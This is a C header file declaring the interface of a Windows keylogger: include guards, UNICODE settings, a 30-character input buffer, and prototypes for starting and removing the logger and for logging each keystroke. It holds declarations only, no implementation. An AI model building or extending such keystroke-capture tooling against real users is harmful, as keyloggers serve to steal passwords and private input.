#ifndef __WINKEYLOGGER_HDR_H__
#define __WINKEYLOGGER_HDR_H__

#ifndef UNICODE
# define UNICODE 1
#endif //UNICODE

#ifndef _UNICODE
# define _UNICODE 1
#endif //_UNICODE

#include <windows.h>
//uncomment these lines if you're compiling on win8+
//#include <synchapi.h>
//#include <processthreadsapi.h>



#define INPUT_BUFFER_SIZE 30

BOOL StartWinKeylogger(void);
void RemoveWinKeylogger(void);
BOOL LogNextKeystroke(size_t *buff_len);
BOOL StrCmpInputBuffer(WCHAR *szBuff);
void StrCpyLoggedBuffer(WCHAR *szBuff);



#endif //__WINKEYLOGGER_HDR_H__
